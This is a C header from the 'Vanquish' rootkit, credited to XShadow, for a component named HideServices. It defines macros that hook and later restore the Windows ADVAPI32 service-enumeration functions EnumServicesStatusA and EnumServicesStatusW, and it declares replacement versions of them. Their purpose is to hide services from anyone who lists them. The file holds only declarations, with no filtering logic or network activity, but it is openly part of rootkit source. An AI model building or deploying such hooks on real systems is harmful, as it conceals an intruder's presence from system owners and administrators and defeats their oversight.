/******************************************************************************\

	Vanquish DLL HideServices - Copyright (c)2003-2005 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#ifndef __VANQUISH_DLL_HIDESERVICES__H__
#define __VANQUISH_DLL_HIDESERVICES__H__

#include "Vanquish_dll.h"

//default load handlers
#define LOAD_KERNEL32__HIDESERVICES
#define LOAD_ADVAPI32__HIDESERVICES \
	INITIAL_REPLACE_API(EnumServicesStatusA, ADVAPI32); \
	INITIAL_REPLACE_API(EnumServicesStatusW, ADVAPI32);

#define LOAD_USER32__HIDESERVICES
#define LOAD_GINADLL__HIDESERVICES

//default UNload handlers
#define UNLOAD_KERNEL32__HIDESERVICES
#define UNLOAD_ADVAPI32__HIDESERVICES \
	FINAL_RESTORE_API(EnumServicesStatusA); \
	FINAL_RESTORE_API(EnumServicesStatusW);

#define UNLOAD_USER32__HIDESERVICES
#define UNLOAD_GINADLL__HIDESERVICES

//declaring handlers
#define DECLARE_HIDESERVICES \
	DECLARE_NEWENTRY(EnumServicesStatusA); \
	DECLARE_NEWENTRY(EnumServicesStatusW);

//extern declare
#define EXTERN_HIDESERVICES \
	EXTERN_NEWENTRY(EnumServicesStatusA); \
	EXTERN_NEWENTRY(EnumServicesStatusW);

//Vanquish NEW API declarations follows
//Declarations are in conformance with the real Windows API header files
//Difference between this and real api prototypes:
//    1) prefixed V to the name
//    2) replaced WINAPI with NEWAPI

//Original header definitions: (winsvc.h)

NEWAPI
BOOL
WINAPI
VEnumServicesStatusA(
    SC_HANDLE hSCManager,
    DWORD dwServiceType,
    DWORD dwServiceState,
    LPENUM_SERVICE_STATUSA lpServices,
    DWORD cbBufSize,
    LPDWORD pcbBytesNeeded,
    LPDWORD lpServicesReturned,
    LPDWORD lpResumeHandle
    );

NEWAPI
BOOL
WINAPI
VEnumServicesStatusW(
    SC_HANDLE hSCManager,
    DWORD dwServiceType,
    DWORD dwServiceState,
    LPENUM_SERVICE_STATUSW lpServices,
    DWORD cbBufSize,
    LPDWORD pcbBytesNeeded,
    LPDWORD lpServicesReturned,
    LPDWORD lpResumeHandle
    );

#endif//__VANQUISH_DLL_HIDESERVICES__H__
